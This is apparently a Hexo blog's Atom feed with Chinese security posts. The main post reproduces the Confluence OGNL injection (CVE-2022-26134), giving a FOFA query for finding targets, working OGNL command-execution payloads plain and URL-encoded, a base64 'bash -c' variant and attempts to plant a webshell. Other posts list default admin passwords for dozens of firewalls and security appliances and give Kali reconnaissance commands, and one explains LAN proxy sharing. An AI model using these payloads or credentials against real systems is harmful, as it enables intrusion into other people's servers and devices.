<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Corey&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://c-hasel.github.io/"/>
  <updated>2022-06-15T10:39:01.110Z</updated>
  <id>https://c-hasel.github.io/</id>
  
  <author>
    <name>Corey</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2022-26134:Confluence远程命令执行漏洞复现</title>
    <link href="https://c-hasel.github.io/2022/06/14/CVE-2022-26134-Confluence%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://c-hasel.github.io/2022/06/14/CVE-2022-26134-Confluence%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-06-14T13:09:21.000Z</published>
    <updated>2022-06-15T10:39:01.110Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="1-漏洞介绍"><a href="#1-漏洞介绍" class="headerlink" title="1. 漏洞介绍"></a>1. 漏洞介绍</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Confluence是一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。使用简单，但它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2022年6月04日，360CETR监测发现Atlassian官方发布了Confluence OGNL 注入漏洞的风险通告，漏洞编号为CVE-2022-26134，漏洞等级：严重，漏洞评分：9.8。目前该漏洞安全补丁已发布，漏洞细节已公开，POC（概念验证代码）已公开，在野利用已发现。但由于本人太菜的原因，因为无法写入webshell，且目标机不出网等，并未发现该漏洞能造成很大的影响。</p><h1 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h1><div style="color:red; background-color:#F5F5F5;padding:16px">Confluence Server and Data Center >= 1.3.0<br>Confluence Server and Data Center < 7.4.17<br>Confluence Server and Data Center < 7.13.7<br>Confluence Server and Data Center < 7.14.3<br>Confluence Server and Data Center < 7.15.2<br>Confluence Server and Data Center < 7.16.4<br>Confluence Server and Data Center < 7.17.4<br>Confluence Server and Data Center < 7.18.1</div><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-fofa语法"><a href="#3-1-fofa语法" class="headerlink" title="3.1 fofa语法"></a>3.1 fofa语法</h2><p><code>&quot;Confluence Data Center&quot; &amp;&amp; title==&quot;登录 - Confluence&quot;</code><br><img alt data-src="/img/CVE-2022-26134/UI.png" class="lazyload"></p><h2 id="3-2-POC"><a href="#3-2-POC" class="headerlink" title="3.2 POC"></a>3.2 POC</h2><p><code>/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}/</code></p><p><strong>url编码</strong></p><p><code>/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/</code></p><p><img alt data-src="/img/CVE-2022-26134/burp1.png" class="lazyload"></p><h2 id="3-3-脚本"><a href="#3-3-脚本" class="headerlink" title="3.3 脚本"></a>3.3 脚本</h2><ul><li><a href="https://github.com/Nwqda/CVE-2022-26134/blob/master/cve-2022-26134.py" target="_blank" rel="noopener">https://github.com/Nwqda/CVE-2022-26134/blob/master/cve-2022-26134.py</a></li></ul><p><strong>用法</strong></p><p><code>python3 cve-2022-26134.py url command</code><img alt data-src="/img/CVE-2022-26134/py.png" class="lazyload"></p><h1 id="4-POC变形尝试写入shell"><a href="#4-POC变形尝试写入shell" class="headerlink" title="4. POC变形尝试写入shell"></a>4. POC变形尝试写入shell</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在遇到rce的目标，我们一般会选择反弹shell或者写入webshell，不过在这里是不出网的，所以反弹shell以及weget下载shell这条路我们走不通，所以选择自己写入webshell。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先我们尝试随便写入txt文件,<code>touch test.txt</code>，可以发现，我们创建了test.txt文件<br><img alt data-src="/img/CVE-2022-26134/touch.png" class="lazyload"><br><img alt data-src="/img/CVE-2022-26134/ls.png" class="lazyload"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们尝试向test.txt中写入内容<code>echo test &gt; test.txt</code><br><img alt data-src="/img/CVE-2022-26134/echo.png" class="lazyload"><br>这里我们的命令参数原样输出了，<code>cat test.txt</code>看一下，果然为空。<br><img alt data-src="/img/CVE-2022-26134/cat.png" class="lazyload"><br>这里涉及到java <code>Runtime.exec()</code>这个方法，在java中<code>Runtime</code>存在两个<code>exec()</code>方法，一个是接收字符串，但字符串会破坏我们命令的结构，导致命令后面的&gt;、&gt;&gt;等不会解析，导致echo后面的参数整个输出。一个是接收数组，有兴趣的可以自行了解下，这里不过多阐述。这里需要构造数组传入。<br>这里有几种方法，第一种，直接在<code>exec()</code>中构造数组传入<code>new String[] {&quot;/bin/sh&quot;,&quot;-c&quot;, &quot;echo 123 &gt; 1.txt&quot;}</code><br><strong>POC1</strong><br><code>${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(new String[] {&quot;/bin/sh&quot;,&quot;-c&quot;, &quot;echo 123 &gt; test.txt&quot;}).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}</code><br><strong>url编码</strong><br><code>%24%7B(%23a%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(new%20String%5B%5D%20%7B%22%2Fbin%2Fsh%22%2C%22-c%22%2C%20%22echo%20123%20%3E%20test.txt%22%7D).getInputStream()%2C%22utf-8%22)).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22X-Cmd-Response%22%2C%23a))%7D</code><br><img alt data-src="/img/CVE-2022-26134/poc1.png" class="lazyload"></p><p>这里执行失败，估计是过滤了什么东西，尝试其他poc<a href="https://www.bugku.net/runtime-exec-payloads/" target="_blank" rel="noopener">java.lang.Runtime.exec() Payload</a><br><code>bash -c {echo,ZWNobyBhYWEgPiAxLnR4dA==}|{base64,-d}|{bash,-i}</code><br><img alt data-src="/img/CVE-2022-26134/payload.png" class="lazyload"></p><p><strong>POC2</strong></p><p><code>${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;bash -c {echo,ZWNobyBhYWEgPiAxLnR4dA==}|{base64,-d}|{bash,-i}&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}</code><br><strong>url编码</strong><br><code>%24%7B(%23a%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%22bash%20-c%20%7Becho%2CZWNobyBhYWEgPiAxLnR4dA%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22).getInputStream()%2C%22utf-8%22)).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22X-Cmd-Response%22%2C%23a))%7D</code><br><img alt data-src="/img/CVE-2022-26134/poc2.png" class="lazyload"><br>依然失败，后面经过测试发现，只要传入<code>}</code>就会执行失败，但是<code>}</code>又是必要的，通过编码也不能执行，在多次尝试失败后，请教了java大佬，再次对poc经过变形，最终发现<code>${(#a=@org.apache.commons.io.IOUtils@toString(new java.lang.ProcessBuilder(&quot;id&quot;).start().getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}</code>同样可以执行命令。<br><strong>url编码</strong><br><code>%24%7B(%23a%3D%40org.apache.commons.io.IOUtils%40toString(new%20java.lang.ProcessBuilder(%22id%22).start().getInputStream()%2C%22utf-8%22)).(%40com.opensymphony.webwork.ServletActionContext%40getResponse().setHeader(%22X-Cmd-Response%22%2C%23a))%7D</code><br><img alt data-src="/img/CVE-2022-26134/poc3.png" class="lazyload"><br>当我高兴的使用<code>${(#a=@org.apache.commons.io.IOUtils@toString(new java.lang.ProcessBuilder(&quot;touch&quot;,&quot;test.txt&quot;).start().getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}</code>创建文件时，发现只是大梦一场空。</p><div class="note warning">            <p><strong>严重声明</strong>:本站内容仅适用于网络安全技术和信息安全爱好者学习研究使用，禁止用于非法用途，学习中请遵循国家相关法律法规，共同维护网络安全</p>          </div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="漏洞复现" scheme="https://c-hasel.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="CVE" scheme="https://c-hasel.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    
      <category term="CVE" scheme="https://c-hasel.github.io/tags/CVE/"/>
    
      <category term="RCE" scheme="https://c-hasel.github.io/tags/RCE/"/>
    
      <category term="漏洞复现" scheme="https://c-hasel.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="java" scheme="https://c-hasel.github.io/tags/java/"/>
    
      <category term="web安全" scheme="https://c-hasel.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>局域网连接ssr</title>
    <link href="https://c-hasel.github.io/2020/10/20/%E5%B1%80%E5%9F%9F%E7%BD%91%E8%BF%9E%E6%8E%A5ssr/"/>
    <id>https://c-hasel.github.io/2020/10/20/%E5%B1%80%E5%9F%9F%E7%BD%91%E8%BF%9E%E6%8E%A5ssr/</id>
    <published>2020-10-20T23:25:01.000Z</published>
    <updated>2022-06-14T16:07:11.473Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="允许来自局域网的连接"><a href="#允许来自局域网的连接" class="headerlink" title="允许来自局域网的连接"></a>允许来自局域网的连接</h1><ul><li><strong>在ssr选项设置里开启允许来自局域网的连接</strong><br><img alt data-src="/img/ssr/ssr.png" class="lazyload"><h1 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h1></li><li><strong>在cmd里面输入<code>ipconfig</code>，查看自己电脑的ip地址</strong></li><li><strong>手机连接WIFI后设置代理为手动，服务器输入电脑ip,端口默认1080</strong><img height="600" width="300" data-src="/img/ssr/proxy.PNG" class="lazyload"></li><li><strong>成功</strong><img height="600" width="300" data-src="/img/ssr/success.PNG" class="lazyload"></li><li><strong>注意有的电脑需要关闭防火墙</strong></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="其他" scheme="https://c-hasel.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="科学上网" scheme="https://c-hasel.github.io/tags/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"/>
    
      <category term="其他" scheme="https://c-hasel.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>常见网络安全设备默认口令</title>
    <link href="https://c-hasel.github.io/2020/03/02/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/"/>
    <id>https://c-hasel.github.io/2020/03/02/%E5%B8%B8%E8%A7%81%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4/</id>
    <published>2020-03-02T21:36:37.000Z</published>
    <updated>2022-06-14T16:07:11.473Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><table>    <tr>        <th> 设备 </th>        <th> 默认账号 </th>        <th> 默认密码 </th>    </tr>    <tr>        <td align="center" style="display:table-cell; vertical-align:middle"> 深信服产品 </td>         <td align="center" style="display:table-cell; vertical-align:middle"> sangfor </td>         <td align="center"> sangfor <br> sangfor@2018 <br> sangfor@2019 </td>    </tr>    <tr>         <td align="center"> 深信服科技 AD </td>         <td align="center"> </td>         <td align="center"> dlanrecover </td>    </tr>    <tr>         <td align="center">深信服负载均衡 AD 3.6 </td>         <td align="center"> admin </td>         <td align="center"> admin </td>    </tr>    <tr>         <td align="center"> 深信服WAC(WBS V2.6) </td>         <td align="center"> admin </td>         <td align="center"> admin </td>    </tr>    <tr>         <td align="center"> 深信服VPN </td>         <td align="center"> Admin </td>         <td align="center"> Admin </td>    </tr>    <tr>         <td align="center"> 深信服ipsec-VPn(SSL 5.5) </td>         <td align="center"> Admin </td>         <td align="center"> Admin </td>    </tr>    <tr>         <td align="center"> 深信服AC6.0 </td>         <td align="center"> admin </td>         <td align="center"> admin </td>     </tr>    <tr>         <td align="center"> SANGFOR防火墙 </td>         <td align="center"> admin </td>         <td align="center"> sangfor </td>    </tr>    <tr>         <td align="center"> 深信服AF(NGAF V2.2) </td>         <td align="center"> admin </td>         <td align="center"> sangfor </td>    </tr>    <tr>          <td align="center"> 深信服NGAF下一代防火墙(NGAF V4.3) </td>         <td align="center"> admin </td>         <td align="center"> admin </td>    </tr>    <tr>        <td align="center"> 深信服上网行为设备数据中心 </td>        <td align="center"> Admin </td>        <td align="center"> 密码为空 </td>    </tr>    <tr>        <td align="center"> SANGFOR_AD_V5.1 </td>        <td align="center"> admin </td>        <td align="center"> admin </td>    </tr>    <tr>        <td align="center" rowspan="3" style="display:table-cell; vertical-align:middle"> 天阗入侵检测与管理系统 V7.0 </td>        <td align="center"> Admin </td>        <td align="center" rowspan="3" style="display:table-cell; vertical-align:middle"> venus70 </td>    </tr>    <tr>        <td align="center"> Audit </td>    </tr>    <tr>        <td align="center"> adm </td>    </tr>    <tr>        <td align="center" rowspan="3" style="display:table-cell; vertical-align:middle"> 天阗入侵检测与管理系统 V6.0 </td>        <td align="center"> Admin </td>        <td align="center" rowspan="3" style="display:table-cell; vertical-align:middle"> venus60 </td>    </tr>    <tr>                <td align="center"> Audit </td>    </tr>    <tr>        <td align="center"> adm </td>    </tr>    <tr>        <td align="center" rowspan="3" style="display:table-cell; vertical-align:middle"> 网御WAF集中控制中心(V3.0R5.0) </td>        <td align="center"> admin </td>        <td align="center" rowspan="3" style="display:table-cell; vertical-align:middle"> leadsec.waf </td>    </tr>    <tr>        <td align="center"> audit </td>    </tr>    <tr>        <td align="center"> adm </td>    </tr>    <tr>        <td align="center"> 联想网御 </td>        <td align="center"> administrator </td>        <td align="center"> administrator </td>    </tr>    <tr>        <td align="center"> 网御事件服务器 </td>        <td align="center"> admin </td>        <td align="center"> admin123 </td>    </tr>    <tr>        <td align="center"> 联想网御防火墙PowerV </td>        <td align="center"> administrator </td>        <td align="center"> administrator </td>    </tr>    <tr>        <td align="center"> 联想网御入侵检测系统 </td>        <td align="center"> lenovo </td>        <td align="center"> default </td>    </tr>    <tr>        <td align="center"> 网络卫士入侵检测系统 </td>        <td align="center"> admin </td>        <td align="center"> talent </td>    </tr>    <tr>        <td align="center" rowspan="2" style="display:table-cell; vertical-align:middle"> 网御入侵检测系统V3.2.72.0 </td>        <td align="center"> adm </td>        <td align="center" rowspan="2" style="display:table-cell; vertical-align:middle"> leadsec32 </td>    </tr>    <tr>        <td align="center"> admin </td>        </tr>        <td align="center" rowspan="2" style="display:table-cell; vertical-align:middle"> 联想网御入侵检测系统V3.2.72.0 </td>        <td align="center"> root </td>        <td align="center"> 111111 </td>    </tr>    <tr>        <td align="center"> admin </td>        <td align="center"> admin123 </td>    </tr>    <tr>        <td align="center"> 科来网络回溯分析系统 </td>        <td align="center"> csadmin </td>        <td align="center"> colasoft </td>    </tr>    <tr>        <td align="center"> 中控考勤机web3.0 </td>        <td align="center"> administrator </td>        <td align="center"> 123456 </td>    </tr>    <tr>        <td align="center"> H3C iMC </td>        <td align="center"> admin </td>        <td align="center"> admin </td>    </tr>    <tr>        <td align="center"> H3C SecPath系列 </td>        <td align="center"> admin </td>        <td align="center"> admin </td>    </tr>    <tr>        <td align="center"> H3C S5120-SI </td>        <td align="center"> test </td>        <td align="center"> 123 </td>    </tr>    <tr>        <td align="center"> H3C智能管理中心 </td>        <td align="center"> admin </td>        <td align="center"> admin </td>    </tr>    <tr>        <td align="center"> H3C ER3100 </td>        <td align="center"> admin </td>        <td align="center"> adminer3100 </td>    </tr>    <tr>        <td align="center"> H3C ER3200 </td>        <td align="center"> admin </td>        <td align="center"> adminer3200 </td>    </tr>    <tr>        <td align="center"> H3C ER3260 </td>        <td align="center"> admin </td>        <td align="center"> adminer3260 </td>    </tr>    <tr>        <td align="center" rowspan="4" style="display:table-cell; vertical-align:middle"> H3C </td>        <td align="center"> admin </td>        <td align="center"> adminer </td>    </tr>    <tr>        <td align="center"> admin </td>        <td align="center"> admin </td>    </tr>    <tr>        <td align="center"> admin </td>        <td align="center"> h3capadmin </td>    </tr>    <tr>        <td align="center"> h3c </td>        <td align="center"> h3c </td>    </tr>    <tr>        <td align="center"> 360天擎 </td>        <td align="center"> admin </td>        <td align="center"> admin </td>    </tr>    <tr>        <td align="center"> 网神防火墙 </td>        <td align="center"> firewall </td>        <td align="center"> firewall </td>    </tr>    <tr>        <td align="center"> 天融信防火墙NGFW40000 </td>        <td align="center"> superman </td>        <td align="center"> talent </td>    </tr>    <tr>        <td align="center" rowspan="3" style="display:table-cell; vertical-align:middle"> 黑盾防火墙 </td>        <td align="center"> admin </td>        <td align="center"> admin </td>    </tr>    <tr>        <td align="center"> rule </td>        <td align="center"> abc123 </td>    </tr>    <tr>        <td align="center"> audit </td>        <td align="center"> abc123 </td>    </tr>    <tr>        <td align="center" rowspan="2" style="display:table-cell; vertical-align:middle"> 华为防火墙 </td>        <td align="center"> telnetuser </td>        <td align="center"> telnetpwd </td>    </tr>    <tr>        <td align="center"> ftpuser </td>        <td align="center"> ftppwd </td>    </tr>    <tr>        <td align="center"> 方正防火墙 </td>        <td align="center"> admin </td>        <td align="center"> admin </td>    </tr>    <tr>        <td align="center"> 飞塔防火墙 </td>        <td align="center"> admin </td>        <td align="center"> 密码为空 </td>    </tr>    <tr>        <td align="center"> Juniper_SSG_5防火墙 </td>        <td align="center"> netscreen </td>        <td align="center"> netscreen </td>    </tr>    <tr>        <td align="center"> 中新金盾硬件防火墙 </td>        <td align="center"> admin </td>        <td align="center"> 123 </td>    </tr>    <tr>        <td align="center"> kill防火墙(冠群金辰) </td>        <td align="center"> admin </td>        <td align="center"> sys123 </td>    </tr>    <tr>        <td align="center" rowspan="3" style="display:table-cell; vertical-align:middle"> 天清汉马USG防火墙 </td>        <td align="center"> admin </td>        <td align="center"> venus.fw </td>    </tr>    <tr>        <td align="center"> Audit </td>        <td align="center"> venus.audit </td>    </tr>    <tr>        <td align="center"> useradmin </td>        <td align="center"> venus.user </td>    </tr>    <tr>        <td align="center"> 阿姆瑞特防火墙 </td>        <td align="center"> admin </td>        <td align="center"> manager </td>    </tr>    <tr>        <td align="center"> 山石网科 </td>        <td align="center"> hillstone </td>        <td align="center"> hillstone </td>    </tr>    <tr>        <td align="center" rowspan="5" style="display:table-cell; vertical-align:middle"> 绿盟安全审计系统 </td>        <td align="center"> weboper </td>        <td align="center"> weboper </td>    </tr>    <tr>        <td align="center"> webaudit </td>        <td align="center"> webaudit </td>    </tr>    <tr>        <td align="center"> conadmin </td>        <td align="center"> conadmin </td>    </tr>    <tr>        <td align="center"> admin </td>        <td align="center"> admin </td>    </tr>    <tr>        <td align="center"> shell </td>        <td align="center"> shell </td>    </tr>    <tr>        <td align="center"> 绿盟产品 </td>        <td align="center"> </td>        <td align="center"> nsfocus123 </td>    </tr>    <tr>        <td align="center"> TopAudit日志审计系统 </td>        <td align="center">　superman </td>        <td align="center"> talent </td>    </tr>    <tr>        <td align="center"> LogBase日志管理综合审计系统 </td>        <td align="center"> admin </td>        <td align="center"> safetybase </td>    </tr>    <tr>        <td align="center"> 网神SecFox运维安全管理与审计系统 </td>        <td align="center"> admin </td>        <td align="center"> !1fw@2soc#3vpn </td>    </tr>    <tr>        <td align="center">　天融信数据库审计系统 </td>        <td align="center"> superman </td>        <td align="center"> telent </td>    </tr>    <tr>        <td align="center"> Hillstone安全审计平台 </td>        <td align="center"> hillstone </td>        <td align="center"> hillstone </td>    </tr>    <tr>        <td align="center"> 网康日志中心　</td>        <td align="center"> ns25000 </td>        <td align="center"> ns25000 </td>    </tr>    <tr>        <td align="center"> 网络安全审计系统(中科新业) </td>        <td align="center"> admin </td>        <td align="center"> 123456 </td>    </tr>    <tr>        <td align="center"> 天玥网络安全审计系统 </td>        <td align="center"> Admin </td>        <td align="center"> cyberaudit </td>    </tr>    <tr>        <td align="center" rowspan="2" style="display:table-cell; vertical-align:middle"> 明御ＷＥＢ应用防火墙 </td>        <td align="center"> admin </td>        <td align="center"> admin </td>    </tr>    <tr>        <td align="center"> admin </td>        <td align="center"> adminadmin </td>    </tr>    <tr>        <td align="center"> 明御攻防实验平台 </td>        <td align="center"> root </td>        <td align="center"> 123456 </td>    </tr>    <tr>        <td align="center"> 明御安全网关 </td>        <td align="center"> admin </td>        <td align="center"> adminadmin </td>    </tr>    <tr>        <td align="center" rowspan="4" style="display:table-cell; vertical-align:middle"> 明御运维审计与册风险控制系统 </td>        <td align="center"> admin </td>        <td align="center"> 1q2w3e </td>    </tr>    <tr>        <td align="center"> system </td>        <td align="center" rowspan="3" style="display:table-cell; vertical-align:middle"> 1q2w3e4r </td>    </tr>    <tr>        <td align="center"> auditor </td>    </tr>    <tr>        <td align="center"> operator </td>    </tr>    <tr>        <td align="center"> 明御网站卫士 </td>        <td align="center"> sysmanager </td>        <td align="center"> sysmanager888 </td>    </tr>    <tr>        <td align="center" rowspan="4" style="display:table-cell; vertical-align:middle"> 亿邮邮件网关 </td>        <td align="center"> eyouuser </td>        <td align="center"> eyou_admin </td>    </tr>    <tr>        <td align="center"> eyougw </td>        <td align="center"> admin@(eyou) </td>    </tr>    <tr>        <td align="center"> admin </td>        <td align="center"> +-ccccc </td>    </tr>    <tr>        <td align="center"> admin　</td>        <td align="center"> cyouadmin </td>    </tr>    <tr>        <td align="center"> Websense邮件安全网关 </td>        <td align="center"> administrator </td>        <td align="center"> admin </td>    </tr>    <tr>        <td align="center">　梭子鱼邮件储存网关 </td>        <td align="center"> admin </td>        <td align="center"> admin </td>    </tr></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="信息收集" scheme="https://c-hasel.github.io/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="网络" scheme="https://c-hasel.github.io/tags/%E7%BD%91%E7%BB%9C/"/>
    
      <category term="设备" scheme="https://c-hasel.github.io/tags/%E8%AE%BE%E5%A4%87/"/>
    
      <category term="密码" scheme="https://c-hasel.github.io/tags/%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>kali信息收集</title>
    <link href="https://c-hasel.github.io/2019/12/12/kali%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://c-hasel.github.io/2019/12/12/kali%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2019-12-12T16:32:39.000Z</published>
    <updated>2022-06-14T16:07:11.473Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><div class="note default">            <p>我们在渗透测试中，第一步工作就是信息收集，所谓知己知彼才能百战百胜，而信息收集的质量，往往直接决定了渗透测试的最终成败，所以我通过查阅资料收集了整理一些常用的信息收集工具。</p>          </div><h1 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whois www.xxx.com</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/whois.png" class="lazyload"></p><h1 id="WAF防火墙识别"><a href="#WAF防火墙识别" class="headerlink" title="WAF防火墙识别"></a>WAF防火墙识别</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wafw00f xxx.com</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/waf.png" class="lazyload"></p><h1 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h1><p>nmap作为渗透测试人员必备、必会的一款工具，这里就不在赘述了。</p><h1 id="查看局域网中的在线设备"><a href="#查看局域网中的在线设备" class="headerlink" title="查看局域网中的在线设备"></a>查看局域网中的在线设备</h1><h2 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fping -agq ip/mask</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/fping.png" class="lazyload"></p><h2 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netdiscover -i eth0</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/net.png" class="lazyload"></p><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sP ip/mask</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/nmap.png" class="lazyload"></p><h1 id="DNS信息收集"><a href="#DNS信息收集" class="headerlink" title="DNS信息收集"></a>DNS信息收集</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fierce -dns xxx.com</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/fire.png" class="lazyload"></p><h1 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dig xxx.com</span><br></pre></td></tr></table></figure><p><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/dig.png" class="lazyload"></p><h1 id="网段信息扫描"><a href="#网段信息扫描" class="headerlink" title="网段信息扫描"></a>网段信息扫描</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dnsmap xxx.com</span><br></pre></td></tr></table></figure><p>dnsmap主要用来在渗透测试的信息收集阶段协助测试网络的基础设施的安全性，它能够发现目标的网段、域名、甚至电话号码等重要信息。<br><img alt data-src="/img/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/dnsmap.png" class="lazyload"></p><h1 id="子域收集"><a href="#子域收集" class="headerlink" title="子域收集"></a>子域收集</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dnsdist6 -4 -t 20 -d -s xxx.com</span><br></pre></td></tr></table></figure><div class="note default no-icon">            <p><strong>options:</strong><br><label style="color:orangered">-4&emsp;&emsp;&emsp;&emsp;只显示IPV4地址信息</label><br><label style="color:orangered">-t&emsp;&emsp;&emsp;&emsp;指定要使用的线程数量，默认是8，最大为32</label><br><label 